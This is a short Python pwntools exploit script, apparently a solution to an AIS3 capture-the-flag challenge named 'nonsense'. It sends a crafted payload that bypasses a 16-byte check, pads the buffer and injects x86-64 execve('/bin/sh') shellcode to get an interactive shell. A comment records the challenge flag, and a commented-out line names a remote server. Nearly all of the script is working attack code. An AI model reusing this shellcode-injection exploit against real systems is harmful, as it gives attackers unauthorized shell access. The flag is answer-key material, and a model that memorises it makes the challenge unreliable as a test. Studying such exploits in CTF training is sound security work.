#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./nonsense')
#r = remote('60.250.197.227',10001)

# byte_601040[16] : 0x62756c6162627577 0x6275646275646162

r.recvuntil('name?')
r.send('aaaabbbbccccdddd')

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r.recvuntil('yours')


raw_input('#')
# | jump to shellcode | bypass check 16bytes| padding | shellcode |
r.sendline(p64(0x62756c6162613377) + p64(0x6275646275646162) + p64(0x62756c6162627577) + p64(0x6275646275646162) + 'a'*0x15 + sh )

# AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!}                                                                                                                                                                      
r.interactive()
